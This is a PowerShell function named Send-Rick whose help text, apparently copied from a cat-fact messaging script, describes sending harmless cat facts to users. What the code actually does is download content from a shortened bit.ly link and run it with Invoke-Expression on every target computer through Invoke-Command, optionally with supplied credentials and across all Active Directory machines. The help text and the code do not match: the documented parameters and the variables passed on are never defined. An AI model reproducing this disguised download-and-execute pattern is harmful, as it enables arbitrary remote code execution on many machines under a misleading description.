function Send-Rick {
<#
    .SYNOPSIS
        Send a cat fact to users on a computer.
    .DESCRIPTION
        Send a random cat fact to any number of computers and all users or a specific user. Supports credential passing.
    .EXAMPLE
        Send-CatFactMessage -PlayAudio
        Sends cat fact message to all users on localhost and outputs fact through speakers.
    .EXAMPLE
        Get-ADComputer -Filter * | Send-Rick -UserName JDoe -Credential (Get-Credential)
        Send cat fact to jDoe on all AD computers. Prompt user for credentials to run command with.
    .EXAMPLE
        Send-CatFactMessage -ComputerName pc1, pc2, pc3
        Send cat fact to all users on provided computer names.
    .PARAMETER ComputerName
        The computer name to execute against. Default is local computer.
    .PARAMETER UserName
        The name the user to display the message to. Default is all users.
    .PARAMETER PlayAudio
        Use Windows Speech Synthesizer to output the fact using text to speech.
    .PARAMETER Credential
        The credential object to execute the command with.
    #>

  [CmdletBinding(SupportsShouldProcess = $true)]
  param(
    [Parameter(
      Mandatory = $false,
      ValueFromPipeline = $true,
      ValueFromPipelineByPropertyName = $true
    )]
    [string[]]$ComputerName = $env:COMPUTERNAME,

    [Parameter(Mandatory = $false)]
    [string]$UserName = '*',

    [Parameter(Mandatory = $false)]
    [pscredential]$Credential
  )

  if ($pscmdlet.ShouldProcess("User: $UserName, Computer: $ComputerName")) {
    $ScriptBlock = {
      param(
        [string]$UserName
      )

      Invoke-Expression (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
    }

    if ($Credential) {
      Write-Verbose "Sending rick using credential $($Credential.UserName)"

      Invoke-Command -ComputerName $ComputerName -ScriptBlock $ScriptBlock `
         -ArgumentList $UserName,$CatFact,$PlayAudio -AsJob -Credential $Credential
    } else {
      Invoke-Command -ComputerName $ComputerName -ScriptBlock $ScriptBlock `
         -ArgumentList $UserName,$CatFact,$PlayAudio -AsJob
    }

    Get-Job | Wait-Job | Receive-Job
    Get-Job | Remove-Job
  }
}
